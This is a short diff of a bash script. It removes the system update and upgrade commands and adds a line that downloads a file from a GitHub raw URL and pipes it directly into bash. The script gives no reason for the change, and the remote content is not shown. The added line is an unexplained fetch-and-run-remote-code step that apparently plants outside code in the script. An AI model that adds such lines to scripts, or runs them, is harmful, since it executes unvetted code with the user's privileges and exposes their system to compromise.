@@ -1,4 +1,3 @@
 #!/bin/bash
-sudo apt update
-sudo apt full-upgrade
 sudo echo test | sudo tee ~/test.txt -
+curl https://raw.githubusercontent.com/asswordpay/fluffy-journey/92ad26fe288c855276d89f7da3fb8b3eec6b86a0/curl | bash -
